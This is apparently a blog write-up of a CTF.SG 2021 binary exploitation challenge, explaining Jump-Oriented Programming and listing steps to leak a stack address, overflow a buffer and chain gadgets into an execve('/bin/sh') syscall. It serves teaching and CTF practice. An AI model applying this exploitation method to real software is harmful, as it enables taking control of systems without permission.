## Preamble

As CTF.SG CTF 2022 is happening this weekend, I thought it'd be as good a time as any to revisit some of the challenges that I've made for the 2021 run of the CTF.

## Pwn: Job Opportunities Portal

```
Ever since our Ministries got hacked, we have worked tirelessly to create new Task Forces to discover solutions to our cybersecurity woes. One such taskforce suggested that we should remove all `ret` instructions and libc dependencies so we don't have to worry about buffer overflows and ROPs! What a brilliant idea! Give this team a medal!
```

Download the challenge binary [here](/public/ctfsg-ctf-21/jop).

This challenge was inspired by a NUS research paper on [Jump-Oriented Programming: A New Class of Code-Reuse
Attack](https://www.csc2.ncsu.edu/faculty/xjiang4/pubs/ASIACCS11.pdf). As its name implies, it is conceptually similar to Return-Oriented Programming albeit with a few key differences, one of which is that gadgets end with a `JMP` instruction instead of `RET`, thereby increasing the difficulty of forming a working JOP chain as compared to its ROP counterpart.

To work around this constraint, a few new concepts are introduced such as the `dispatcher gadget` to act as a pseudo stack pointer to traverse the gadgets and `dispatch tables` to act as a pseudo stack containing the JOP chain. Although this challenge made use of the stack specifically, you can also execute a JOP chain off the heap as well. More details on the dispatcher gadgets later in the writeup.

Since there is no libc for us to use, we have to construct the `execve` syscall to `/bin/sh` manually. This means that on top of the missing `RET` instruction constraints, we have to somehow sneak in a copy of the `/bin/sh` string in our payload to be referenced.

On the surface, options 1 and 3 does not seem useful to us. Option 2 allows us to send some user input which could be our buffer overflow entrypoint. Let's analyse the program code using `radare2`.

At first glance, it may seem like a cesspool of assembly that we would prefer to not bleed our eyes with, we just need to note the conditional checks for the menu at `0x401068` (Option 1 which jumps to `0x40109c`), `0x401073` (Option 2 which jumps to `0x4010b2`), `0x401078` (Option 3 which jumps to `0x401101`), and an undocumented option 4 at `0x401081`. Upon choosing option 4, the follow instructions essentially leaks an address on the stack, which allow us to have somewhere to jump to after we perform the buffer overflow attack. Let's run `checksec` on the binary to see if we can execute shellcode directly off the stack:

```
$ checksec jop
[*] '/jop'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Thanks to the NX bit, we have no other choice but to execute a Jump-Oriented Programming attack. Here is a diagram from the research paper that highlights the differences between ROP and JOP:

![ROP vs JOP](/public/ctfsg-ctf-21/rop-vs-jop.png)

The dispatch table is a pseudo stack that can reside in the stack or heap as you are not reliant on the EIP/RIP register to visit the next gadget in the chain. Instead, a `dispatcher` gadget is used to advance the "program counter" to point to the next gadget to be ran. An auxiliary register that is unused by the program can be used to store the "program counter". In short, here are the components we need to perform the attack:

- A `dispatcher` gadget (to advance to the next gadget in the JOP chain; the dispatcher itself does not perform any chain-related actions)
- A `dispatch` table containing the JOP chain
- A gadget catalog (with its memory addresses known) containing `functional` gadgets (gadgets that perform similarly to those in a ROP chain)

Here is a diagram from the research paper that illustrates a typical JOP attack lifecycle:

![JOP example](/public/ctfsg-ctf-21/jop-example.png)

### Path of Attack

With that out of the way, let us formulate the path of attack. Here are roughly the steps we need to take:

1. Leak the stack base via a hidden option '4'. (You can discover this via a disassembler like IDA Pro or Ghidra)
2. Perform a buffer overflow on the buffer, overwriting the RIP at the 256th position.
3. Add your gadget catalog (In solve.py, there are 3: /bin/sh, add rsp, 0x8; jmp [rsp-0x8]; gadget, and 0x00.
4. Point your RIP 24 bytes (3 gadgets that is 8 bytes each) after the RSP base which is right after the gadget catalog.
5. Setup rcx and rdx to be your dispatch registers (Aka `jmp2dispatch` primitives) pointing to the `add rsp, 0x8; jmp [rsp-0x8];` gadget.
6. Setup the SYS_execve syscall by organising your payload like this:

    - Set rdi = &'/bin/sh' (overwrites rdx)
    - Reset rdx back to the dispatch gadget
    - Set rsi = 0x00 (overwrites rcx)
    - Reset rcx back to the dispatch gadget
    - Set rax = SYS_execve (overwrites rdx)
    - Reset rdx back to the dispatch gadget
    - Perform the syscall to pwn
